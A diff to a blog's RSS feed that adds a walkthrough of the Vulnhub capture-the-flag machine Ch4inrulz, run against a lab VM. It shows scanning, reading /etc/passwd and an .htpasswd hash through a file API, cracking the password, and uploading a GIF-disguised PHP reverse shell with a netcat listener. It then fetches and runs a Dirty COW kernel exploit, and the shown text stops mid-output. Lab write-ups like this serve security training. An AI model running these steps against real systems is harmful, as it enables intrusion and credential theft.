@@ -7,6 +7,513 @@
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
     
       <item>
+        <title>Vulnhub.com - Ch4inrulz</title>
+        <description>&lt;p&gt;Today we’re going to walk through a machine from Vulnhub called &lt;strong&gt;Ch4inrulz&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Frank has a small website and he is a smart developer with a normal security background , he always love to follow patterns , your goal is to discover any critical vulnerabilities and gain access to the system , then you need to gain root access in order to capture the root flag.
+
+This machine was made for Jordan’s Top hacker 2018 CTF , we tried to make it simulate a real world attacks in order to improve your penetration testing skills.
+
+The machine was tested on vmware (player / workstation) and works without any problems , so we recommend to use VMware to run it , Also works fine using virtualbox.
+
+Difficulty: Intermediate , you need to think out of the box and collect all the puzzle pieces in order to get the job done.
+
+The machine is already got DHCP enabled , so you will not have any problems with networking.
+
+Happy Hacking !
+
+v1 - 25/07/2018 v1.0.1 - 31/07/2018 *Fixes DHCP Issue*  &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Author: &lt;a href=&quot;https://twitter.com/@mohammadaskar2&quot;&gt;mohammadaskar2&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Download: &lt;a href=&quot;https://www.vulnhub.com/entry/ch4inrulz-101,247/&quot;&gt;https://www.vulnhub.com/entry/ch4inrulz-101,247/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;Firstly, we can do an &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# nmap -sC -sV -sS -A -v 10.0.0.14
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-09 12:36 EDT
+NSE: Loaded 148 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 12:36
+Completed NSE at 12:36, 0.00s elapsed
+Initiating NSE at 12:36
+Completed NSE at 12:36, 0.00s elapsed
+Initiating ARP Ping Scan at 12:36
+Scanning 10.0.0.14 [1 port]
+Completed ARP Ping Scan at 12:36, 0.04s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 12:36
+Completed Parallel DNS resolution of 1 host. at 12:36, 0.00s elapsed
+Initiating SYN Stealth Scan at 12:36
+Scanning 10.0.0.14 [1000 ports]
+Discovered open port 80/tcp on 10.0.0.14
+Discovered open port 22/tcp on 10.0.0.14
+Discovered open port 21/tcp on 10.0.0.14
+Discovered open port 8011/tcp on 10.0.0.14
+Completed SYN Stealth Scan at 12:36, 0.12s elapsed (1000 total ports)
+Initiating Service scan at 12:36
+Scanning 4 services on 10.0.0.14
+Completed Service scan at 12:36, 11.03s elapsed (4 services on 1 host)
+Initiating OS detection (try #1) against 10.0.0.14
+NSE: Script scanning 10.0.0.14.
+Initiating NSE at 12:36
+NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
+Completed NSE at 12:36, 0.77s elapsed
+Initiating NSE at 12:36
+Completed NSE at 12:36, 0.00s elapsed
+Nmap scan report for 10.0.0.14
+Host is up (0.00064s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 2.3.5
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.0.0.4
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 2.3.5 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 d4:f8:c1:55:92:75:93:f7:7b:65:dd:2b:94:e8:bb:47 (DSA)
+|   2048 3d:24:ea:4f:a2:2a:ca:63:b7:f4:27:0f:d9:17:03:22 (RSA)
+|_  256 e2:54:a7:c7:ef:aa:8c:15:61:20:bd:aa:72:c0:17:88 (ECDSA)
+80/tcp   open  http    Apache httpd 2.2.22 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD POST
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+|_http-title: FRANK's Website | Under development
+8011/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD POST
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+MAC Address: 08:00:27:99:7D:E7 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.19 - 2.6.36
+Uptime guess: 497.101 days (since Thu Mar 30 10:11:48 2017)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=198 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.64 ms 10.0.0.14
+
+NSE: Script Post-scanning.
+Initiating NSE at 12:36
+Completed NSE at 12:36, 0.00s elapsed
+Initiating NSE at 12:36
+Completed NSE at 12:36, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.15 seconds
+           Raw packets sent: 1020 (45.626KB) | Rcvd: 1016 (41.354KB)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We can see a whole range of open ports &lt;code class=&quot;highlighter-rouge&quot;&gt;80&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;8011&lt;/code&gt; for &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; servers, &lt;code class=&quot;highlighter-rouge&quot;&gt;21&lt;/code&gt; for &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;22&lt;/code&gt; for &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt;. From the start I decided to check the &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; port for some publicly available files.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# ftp 10.0.0.14
+Connected to 10.0.0.14.
+220 (vsFTPd 2.3.5)
+Name (10.0.0.14:root): Anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&amp;gt; ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        111          4096 Apr 13 17:19 .
+drwxr-xr-x    2 0        111          4096 Apr 13 17:19 ..
+226 Directory send OK.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Unfortunately there’s nothing in there, so my next step was to check &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; at port &lt;code class=&quot;highlighter-rouge&quot;&gt;80&lt;/code&gt;. As it’s pretty normal landing page, I decided to run a &lt;code class=&quot;highlighter-rouge&quot;&gt;dirb&lt;/code&gt; scan for directories.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# dirb http://10.0.0.14
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Mon Aug 20 04:09:45 2018
+URL_BASE: http://10.0.0.14/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.0.0.14/ ----
++ http://10.0.0.14/cgi-bin/ (CODE:403|SIZE:285)                                
+==&amp;gt; DIRECTORY: http://10.0.0.14/css/                                           
++ http://10.0.0.14/development (CODE:401|SIZE:476)                             
+==&amp;gt; DIRECTORY: http://10.0.0.14/img/                                           
++ http://10.0.0.14/index (CODE:200|SIZE:334)                                   
++ http://10.0.0.14/index.html (CODE:200|SIZE:13516)                            
+==&amp;gt; DIRECTORY: http://10.0.0.14/js/                                            
++ http://10.0.0.14/LICENSE (CODE:200|SIZE:1093)                                
++ http://10.0.0.14/robots (CODE:200|SIZE:21)                                   
++ http://10.0.0.14/robots.txt (CODE:200|SIZE:21)                               
++ http://10.0.0.14/server-status (CODE:403|SIZE:290)                           
+==&amp;gt; DIRECTORY: http://10.0.0.14/vendor/                                        
+                                                                               
+---- Entering directory: http://10.0.0.14/css/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://10.0.0.14/img/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://10.0.0.14/js/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://10.0.0.14/vendor/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+-----------------
+END_TIME: Mon Aug 20 04:09:49 2018
+DOWNLOADED: 4612 - FOUND: 8&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Here, we can see a &lt;code class=&quot;highlighter-rouge&quot;&gt;development&lt;/code&gt; directory, which is protected by password, so I decided to move on and scan another &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; port - &lt;code class=&quot;highlighter-rouge&quot;&gt;8011&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.0.0.14:8011 -x .txt,.php,.html
+
+Gobuster v1.4.1              OJ Reeves (@TheColonial)
+=====================================================
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.0.0.14:8011/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Status codes : 200,204,301,302,307
+[+] Extensions   : .txt,.php,.html
+=====================================================
+/index.html (Status: 200)
+/api (Status: 301)
+=====================================================&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;An &lt;code class=&quot;highlighter-rouge&quot;&gt;/api/&lt;/code&gt; directory? Let’s check that.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl 10.0.0.14:8011/api/
+&amp;lt;title&amp;gt;FRANK's API | Under development&amp;lt;/title&amp;gt;
+
+&amp;lt;center&amp;gt;&amp;lt;h2&amp;gt;This API will be used to communicate with Frank's server&amp;lt;/h2&amp;gt;&amp;lt;/center&amp;gt;
+&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;but it's still under development&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;
+&amp;lt;center&amp;gt;&amp;lt;p&amp;gt;* web_api.php&amp;lt;/p&amp;gt;&amp;lt;/center&amp;gt;
+&amp;lt;center&amp;gt;&amp;lt;p&amp;gt;* records_api.php&amp;lt;/p&amp;gt;&amp;lt;/center&amp;gt;
+&amp;lt;center&amp;gt;&amp;lt;p&amp;gt;* files_api.php&amp;lt;/p&amp;gt;&amp;lt;/center&amp;gt;
+&amp;lt;center&amp;gt;&amp;lt;p&amp;gt;* database_api.php&amp;lt;/p&amp;gt;&amp;lt;/center&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;By checking all of these files, only &lt;code class=&quot;highlighter-rouge&quot;&gt;files_api.php&lt;/code&gt; is present.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl 10.0.0.14:8011/api/web_api.php
+&amp;lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&amp;gt;
+&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;
+&amp;lt;title&amp;gt;404 Not Found&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
+&amp;lt;h1&amp;gt;Not Found&amp;lt;/h1&amp;gt;
+&amp;lt;p&amp;gt;The requested URL /api/web_api.php was not found on this server.&amp;lt;/p&amp;gt;
+&amp;lt;hr&amp;gt;
+&amp;lt;address&amp;gt;Apache/2.2.22 (Ubuntu) Server at 10.0.0.14 Port 8011&amp;lt;/address&amp;gt;
+&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
+root@kali:~# curl 10.0.0.14:8011/api/records_api.php
+&amp;lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&amp;gt;
+&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;
+&amp;lt;title&amp;gt;404 Not Found&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
+&amp;lt;h1&amp;gt;Not Found&amp;lt;/h1&amp;gt;
+&amp;lt;p&amp;gt;The requested URL /api/records_api.php was not found on this server.&amp;lt;/p&amp;gt;
+&amp;lt;hr&amp;gt;
+&amp;lt;address&amp;gt;Apache/2.2.22 (Ubuntu) Server at 10.0.0.14 Port 8011&amp;lt;/address&amp;gt;
+&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
+root@kali:~# curl 10.0.0.14:8011/api/files_api.php
+
+&amp;lt;head&amp;gt;
+  &amp;lt;title&amp;gt;franks website | simple website browser API&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;
+
+&amp;lt;p&amp;gt;No parameter called file passed to me&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;* Note : this API don't use json , so send the file name in raw format&amp;lt;/p&amp;gt;
+root@kali:~# curl 10.0.0.14:8011/api/database_api.php
+&amp;lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&amp;gt;
+&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;
+&amp;lt;title&amp;gt;404 Not Found&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
+&amp;lt;h1&amp;gt;Not Found&amp;lt;/h1&amp;gt;
+&amp;lt;p&amp;gt;The requested URL /api/database_api.php was not found on this server.&amp;lt;/p&amp;gt;
+&amp;lt;hr&amp;gt;
+&amp;lt;address&amp;gt;Apache/2.2.22 (Ubuntu) Server at 10.0.0.14 Port 8011&amp;lt;/address&amp;gt;
+&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We can see that it needs a &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; parameter, which we can do with &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl http://10.0.0.14:8011/api/files_api.php?file=index.php
+
+&amp;lt;head&amp;gt;
+  &amp;lt;title&amp;gt;franks website | simple website browser API&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;
+
+&amp;lt;b&amp;gt;********* HACKER DETECTED *********&amp;lt;/b&amp;gt;&amp;lt;p&amp;gt;YOUR IP IS : 10.0.0.4&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;WRONG INPUT !!&amp;lt;/p&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Hmmm, it blocks our request. After a while of trying out different things, I’ve noticed that changing &lt;code class=&quot;highlighter-rouge&quot;&gt;GET&lt;/code&gt; TO &lt;code class=&quot;highlighter-rouge&quot;&gt;POST&lt;/code&gt; will allow us to return the correct ouptut - contents of &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl -X POST -d file=/etc/passwd 10.0.0.14:8011/api/files_api.php
+
+&amp;lt;head&amp;gt;
+  &amp;lt;title&amp;gt;franks website | simple website browser API&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;
+
+root:x:0:0:root:/root:/bin/bash
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+frank:x:1000:1000:frank,,,:/home/frank:/bin/bash
+sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
+ftp:x:103:111:ftp daemon,,,:/srv/ftp:/bin/false&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Okay, so as we can read files with that &lt;code class=&quot;highlighter-rouge&quot;&gt;api&lt;/code&gt;, why don’t we try and read the content of the &lt;code class=&quot;highlighter-rouge&quot;&gt;index&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;development&lt;/code&gt; area?&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl -X POST -d file=/var/www/development/index.html 10.0.0.14:8011/api/files_api.php
+
+&amp;lt;head&amp;gt;
+  &amp;lt;title&amp;gt;franks website | simple website browser API&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;
+
+&amp;lt;title&amp;gt;my Development tools&amp;lt;/title&amp;gt;
+&amp;lt;b&amp;gt;* Here is my unfinished tools list&amp;lt;/b&amp;gt;
+
+&amp;lt;h4&amp;gt;- the uploader tool (finished but need security review)&amp;lt;/h4&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;More information, there’s possibly a tool to upload files. But still, we need to get access so we can use it. For now only reading is possible.&lt;/p&gt;
+
+&lt;p&gt;But as the protection is from the web server itself, we could possibly find information about in &lt;code class=&quot;highlighter-rouge&quot;&gt;.htaccess&lt;/code&gt; file.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl -X POST -d file=/var/www/development/.htaccess 10.0.0.14:8011/api/files_api.php
+
+&amp;lt;head&amp;gt;
+  &amp;lt;title&amp;gt;franks website | simple website browser API&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;
+
+AuthUserFile /etc/.htpasswd
+AuthName &quot;Frank Development Area&quot;
+AuthType Basic
+AuthGroupFile /dev/null
+
+&amp;lt;Limit GET POST&amp;gt;
+
+require valid-user
+
+&amp;lt;/Limit&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great, let’s get the &lt;code class=&quot;highlighter-rouge&quot;&gt;.htpasswd&lt;/code&gt; file with the password to protected area.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl -X POST -d file=/etc/.htpasswd 10.0.0.14:8011/api/files_api.php
+
+&amp;lt;head&amp;gt;
+  &amp;lt;title&amp;gt;franks website | simple website browser API&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;
+
+frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we can crack the password with &lt;code class=&quot;highlighter-rouge&quot;&gt;johntheripper&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# echo 'frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0' &amp;gt; pass.txt
+root@kali:~# john pass.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ [MD5 128/128 AVX 4x3])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+frank!!!         (frank)
+1g 0:00:00:00 DONE 1/3 (2018-08-14 09:10) 33.33g/s 6266p/s 6266c/s 6266C/s frank!!..fr4nk
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Not a hard password to brute force.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/ch4inrulz/development.png&quot; alt=&quot;Development Area&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After logging in in, we can already move to the &lt;code class=&quot;highlighter-rouge&quot;&gt;/uploader&lt;/code&gt; tool as previously discovered.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/ch4inrulz/uploader.png&quot; alt=&quot;Uploader&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;By uploading some test files, I’ve noticed that we can only upload images. But we can try to trick it by getting &lt;code class=&quot;highlighter-rouge&quot;&gt;php-reverse-shell&lt;/code&gt; and adding &lt;code class=&quot;highlighter-rouge&quot;&gt;gif&lt;/code&gt; file header into the exploit.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# vi php-reverse-shell.php
+root@kali:~# file php-reverse-shell.php
+php-reverse-shell.php: GIF image data, version 89a, 2570 x 16188
+root@kali:~# cat php-reverse-shell.php
+GIF89a
+
+&amp;lt;?php
+
+File is an image - image/gif.Sorry, only JPG, JPEG, PNG &amp;amp; GIF files are allowed.Sorry, your file was not uploaded. &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;In addition, we have to change the extension of the shell.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# mv php-reverse-shell.php php-reverse-shell.gif
+
+File is an image - image/gif.The file php-reverse-shell.gif has been uploaded to my uploads path. &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we have to find the &lt;code class=&quot;highlighter-rouge&quot;&gt;upload&lt;/code&gt; path. This was the most time consuming part as &lt;code class=&quot;highlighter-rouge&quot;&gt;dirb&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; with different wordlists didn’t seem to find anything valuable. In addition, there were no clues in the system.&lt;/p&gt;
+
+&lt;p&gt;After a few hours, I’ve found that &lt;code class=&quot;highlighter-rouge&quot;&gt;my uploads&lt;/code&gt; may be just &lt;code class=&quot;highlighter-rouge&quot;&gt;frank uploads&lt;/code&gt;. Still nothing, so after few more hours of fiddling, here we have &lt;code class=&quot;highlighter-rouge&quot;&gt;FRANKuploads&lt;/code&gt;. We can now get to our uploaded reverse shell with file api, while running a listener.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl -X POST -d file=/var/www/development/uploader/FRANKuploads/php-reverse-shell.gif 10.0.0.14:8011/api/files_api.php
+
+root@kali:~# nc -lvp 1337
+listening on [any] 1337 ...
+10.0.0.14: inverse host lookup failed: Unknown host
+connect to [10.0.0.4] from (UNKNOWN) [10.0.0.14] 33643
+Linux ubuntu 2.6.35-19-generic #28-Ubuntu SMP Sun Aug 29 06:34:38 UTC 2010 x86_64 GNU/Linux
+ 05:38:18 up 46 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: can't access tty; job control turned off
+$ whoami
+www-data&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;First flag is in the home direcotory of &lt;code class=&quot;highlighter-rouge&quot;&gt;frank&lt;/code&gt; user.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;$ cd home
+$ ls -la
+total 12
+drwxr-xr-x  3 root  root  4096 Apr 13 16:06 .
+drwxr-xr-x 22 root  root  4096 Apr 13 16:10 ..
+drwxr-xr-x  3 frank frank 4096 Apr 14 07:37 frank
+$ cd frank
+$ ls -la
+total 36
+drwxr-xr-x 3 frank frank 4096 Apr 14 07:37 .
+drwxr-xr-x 3 root  root  4096 Apr 13 16:06 ..
+-rw------- 1 frank frank   26 Jul 31 07:44 .bash_history
+-rw-r--r-- 1 frank frank  220 Apr 13 16:06 .bash_logout
+-rw-r--r-- 1 frank frank 3353 Apr 13 16:06 .bashrc
+drwxr-xr-x 2 frank frank 4096 Apr 13 16:07 .cache
+-rw-r--r-- 1 frank frank  675 Apr 13 16:06 .profile
+-rw-r--r-- 1 frank frank    0 Apr 13 16:08 .sudo_as_admin_successful
+-rw-r--r-- 1 frank frank   29 Apr 14 07:37 PE.txt
+-rw-r--r-- 1 frank frank   33 Apr 14 07:36 user.txt
+$ cat user.txt
+4795aa2a9be22fac10e1c25794e75c1b&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we have to get to the higher privileges. During usual enumeration, I’ve noticed that the only unusal thing in this system is outdated kernel.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;$ python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+www-data@ubuntu:/home/frank$ cat PE.txt
+cat PE.txt
+Try it as fast as you can ;)
+
+www-data@ubuntu:/$ uname -a
+uname -a
+Linux ubuntu 2.6.35-19-generic #28-Ubuntu SMP Sun Aug 29 06:34:38 UTC 2010 x86_64 GNU/Linux&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we just have to exlpoit the system using &lt;a href=&quot;https://www.exploit-db.com/exploits/40839/&quot;&gt;this exploit&lt;/a&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# wget https://www.exploit-db.com/raw/40839/
+--2018-08-19 11:49:45--  https://www.exploit-db.com/raw/40839/
+Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8
+Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5006 (4.9K) [text/plain]
+Saving to: ‘index.html’
+
+index.html          100%[===================&amp;gt;]   4.89K  --.-KB/s    in 0s      
+
+2018-08-19 11:49:46 (43.5 MB/s) - ‘index.html’ saved [5006/5006]
+
+
+root@kali:~# mv index.html exploit.c
+root@kali:~# python -m SimpleHTTPServer 8080
+Serving HTTP on 0.0.0.0 port 8080 ...
+10.0.0.14 - - [19/Aug/2018 11:51:08] &quot;GET /exploit.c HTTP/1.0&quot; 200 -
+
+www-data@ubuntu:/tmp$ mv exploit.c dirty.c                
+mv exploit.c dirty.c
+www-data@ubuntu:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
+gcc -pthread dirty.c -o dirty -lcrypt
+
+
+www-data@ubuntu:/tmp$ ./dirty
+./dirty
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: test
+
+Complete line:
+firefart:fi6bS9A.C7BDQ:0:0:pwned:/root:/bin/bash
+
